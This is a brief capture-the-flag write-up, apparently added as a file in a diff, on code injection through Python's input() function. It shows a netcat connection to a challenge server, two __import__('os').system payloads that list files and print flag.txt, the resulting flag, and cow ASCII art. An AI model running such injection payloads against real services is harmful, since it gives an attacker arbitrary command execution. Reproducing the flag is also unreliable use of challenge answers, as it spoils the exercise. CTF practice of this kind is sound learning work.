@@ -1,0 +1,28 @@
+#code injection - function input() with security problems
+#https://www.youtube.com/watch?v=Swwq7373nZI
+
+nc 167.99.243.7 5005
+Hello! How old are you?
+__import__('os').system("dir")
+flag.txt  moo.py  run.sh
+                 (__) 
+                 (oo) 
+           /------\/ 
+          / |    ||   
+         *  /\---/\ 
+            ~~   ~~   
+..."Have you mooed today?"...
+
+
+
+nc 167.99.243.7 5005
+Hello! How old are you?
+__import__('os').system("cat flag.txt")
+TPAS{M0o_Mo0_M00_m0oo_Moo0001337000o_00o0o0om0o}
+                 (__) 
+                 (oo) 
+           /------\/ 
+          / |    ||   
+         *  /\---/\ 
+            ~~   ~~   
+..."Have you mooed today?"...
